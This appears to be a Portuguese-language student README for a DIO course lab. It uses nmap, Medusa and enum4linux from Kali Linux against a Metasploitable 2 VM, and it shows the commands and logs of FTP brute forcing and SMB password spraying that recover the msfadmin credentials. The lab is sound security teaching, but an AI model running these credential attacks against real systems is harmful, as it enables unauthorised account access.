# new 🐦‍⬛
para projetos

CONFIGURAÇÃO

Precisaremos do Kali Linux, Metasploitable 2 e Medusa, bom a seguir só vamos configurar a rede de cada um, eu estou rodando em uma maquina virtual, vamos agora abrir as configurações e mudar a rede de ambos para placa de rede única do hospedeiro em ambos as maquinas virtuais.

LOCALIZAR O ENDEREÇO IP

Aqui a duas formas uma utilizando o nmap e a outra é você já sabendo o endereço ip, a também outras ferramentas que você pode usar se quiser, primeiro precisamos achar onde estamos isso conseguimos com o comando
ip a no terminal, oque a gente quer agora é o ipnet /24, a partir dele a gente vai fazer o nmap fazer vários pings é saber quais ip tem portas aberta é quais protocolos estão desprotegidos, com o comando sudo nmap -n -v -sV -p 21-455 xxx.xxx.xxx.xxx/24, o sudo executa como super usuário, o nmap para usar o nmap, o -n para pular a parte da resolução do dns, -sV para sondar portas abertas é suas versões e serviços, o -p é para escanear portas especificas, exemplo 21,22,80 ele buscara apenas essas portas, quando fazemos 21-455 todas as portas que estão entre 21 e 455 vão ser sondada, é por ultimo o ipnet /24 que no meu foi 192.168.56.102, em caso de dúvidas você pode utilizar nmap -h que informara oque cada parâmetro faz é informa sobre outros parâmetros não abordados aqui.

Nmap scan report for 192.168.56.101

PORT    STATE SERVICE     VERSION

21/tcp  open  ftp         vsftpd 2.3.4

22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

23/tcp  open  telnet      Linux telnetd

25/tcp  open  smtp        Postfix smtpd

53/tcp  open  domain      ISC BIND 9.4.2

80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)

111/tcp open  rpcbind     2 (RPC #100000)

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

Aqui achamos portas abertas o serviço é a versão, agora vamos fazer uma ataque de brute force no ftp.

OQUE É FTP?

O FTP (File Transfer Protocol ou Protocolo de Transferência de Arquivos) é um protocolo de rede usado para enviar e baixar arquivos entre um computador (cliente) e um servidor em uma rede baseada em TCP/IP, como a internet.

PREPARANDO AS LISTA DE USUARIO E SENHA(WORDLIST)

Aqui vamos preparar a nossa lista que vai ser usada pra o ataque, se quiser você pode pegar uma lista pronta, o importante é que ela seja .txt, para criar a nossa lista o chamando que vamos utilizar é echo -e "user\nmsfadmin\admin\nroot" >  users.txt , o entra aspas é onde você coloca os user que você quer que sejam rodado o users.txt, users o nome do arquivo e .txt pois é um arquivo de texto, nisso faremos outro com o mesmo comando botando as senhas é mudando o nome do arquivo para pass.txt que tem que conter msfadmin em ambos tanto users quanto pass, pode ser feito também usando o nano é dentro do nano você tem que deixar cada usuário em apenas uma linha digitou um usuário aperta enter e digita o próximo a mesma coisa para as senhas.

ATAQUE DE BRUTE FORCE COM MEDUSA FTP

O comando que vamos utilizar agora é medusa -h xxx.xxx.xxx.xxx -U users.txt -P pass.txt -M ftp -t 6, o medusa para utilizar o medusa, -h para qual o ip que as postas estão aberta o 192.168.56.101 que esta logo aqui em baixo, -U para o arquivo contendo os usuários para ser testadas, -P para o arquivo contendo as senhas para ser testadas, o -M aqui colocamos serviço que é o ftp, o -t Número total de logins a serem testados simultaneamente, caso queira ver os outros parâmetros medusa -h.
2026-11-16 17:24:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (1 of 4 complete)

2026-11-16 17:24:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (2 of 4 complete)

2026-11-16 17:24:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (3 of 4 complete)

2026-11-16 17:24:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 123456 (1 of 4 complete)

2026-11-16 17:24:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: password (2 of 4 complete)

2026-11-16 17:24:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: qwerty (4 of 4 complete)

2026-11-16 17:24:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)

2026-11-16 17:24:37 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

2026-11-16 17:24:43 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)

2026-11-16 17:24:43 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (3 of 4, 4 complete) Password: password (2 of 4 complete)

2026-11-16 17:24:43 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (3 of 4, 4 complete) Password: qwerty (3 of 4 complete)

2026-11-16 17:24:43 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (3 of 4, 4 complete) Password: msfadmin (4 of 4 complete)

2026-11-16 17:24:43 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (4 of 4, 5 complete) Password: 123456 (1 of 4 complete)

2026-11-16 17:24:43 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 5 complete) Password: qwerty (4 of 4 complete)

2026-11-16 17:24:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (4 of 4, 5 complete) Password: password (2 of 4 complete)

2026-11-16 17:24:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (4 of 4, 5 complete) Password: msfadmin (3 of 4 complete)

2026-11-16 17:24:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (4 of 4, 5 complete) Password: qwerty (4 of 4 complete)

Após as tentativas oque queremos é o ACCOUNT FOUND, que foi ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS], sendo user o usuário e a senha o password.

COMO ACESSAR O FTP ?

Para acessar pasta utiliza o comando ftp e o ip o meu foi 192.168.56.101, é teclas enter no terminal em seguida vai pedir o user e o password, usuário e senha que a gente já sabe que são User: msfadmin Password: msfadmin, para sair do ftp escreva quit é de enter.

FORMULÁRIO WEB

O formulário web não tem como mencionar aqui pois estou tentando resolver ele ainda, porque esta disparando um falso positivo oque inclusive acontece na aula que ele é mostrado e ainda não achei uma resolução para o mesmo, por isso essa parte não será abordada aqui, para quem esta vendo esse readme que não é da dio, esse readme foi feito para a entrega de um projeto, abrir um fórum lá na dio, alguns relataram que usaram o hydra, é a outro relato de falso positivo oque anula esse ataque pois não serviria aborda o mesmo aqui por esse motivos, quando descobrir eu volto aqui é edito essa parte ok .🐦‍⬛

OQUE É SMB ?

O protocolo SMB da Microsoft é um serviço de rede que permite que computadores e servidores compartilhem pastas, arquivos e impressoras como se estivessem armazenados localmente

ATAQUE DE BRUTE FORCE SMB

PASSWORD SPRAYING

Mais antes disso tenho que fazer uma pequena correção, aparamente mais um erro na aula da dio é dessa vez envolvendo o Password Spraying, na aula ele é feito como brute force oque nesse caso não é valido, pois não é oque a gente quer é Password Spraying é a maneira de fazer ele é medusa -h 192.168.56.101 -U smb_users.txt -p "msfadmin" -M smbnt -t 2 -t 50, o smb_users.txt e a mesma coisa do user.txt só muda o nome no meu caso é claro, lá na dio é a mesma coisa, então usar medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -t 50
está errado pois ele testa uma lista é não uma única senha pra vários, oque era o intuito original.  

ATAQUE DE BRUTE FORCE SMB
Você usa o comando enum4linux -a 192.168.56.101 | tee enum4_output.txt , para saber mais informações sobre os usuários e em seguida armazena elas em um arquivo txt, para conferir qual usuários e senhas estão certo você pode tanto fazer um ataque de brute force normal ou um Password Spraying pra ver qual deles você tem acesso pois assim se vai saber o usuário e senha, no exemplo a seguir eu fiz com Password Spraying com o comando medusa -h 192.168.56.101 -U smb_users.txt -p "msfadmin" -M smbnt -t 2 -t 50


2026-11-18 17:03:06 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 2 complete) Password: msfadmin (1 of 1 complete)

2026-11-18 17:03:06 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: msfadmin (1 of 1 complete)

2026-11-18 17:03:06 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 3 complete) Password: msfadmin (1 of 1 complete)

2026-11-18 17:03:06 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]

para se conectar no SMB pasta usar o comando smbclient -L //192.168.56.101 -U msfadmin o ip que deseja é o -U que é o usuário.
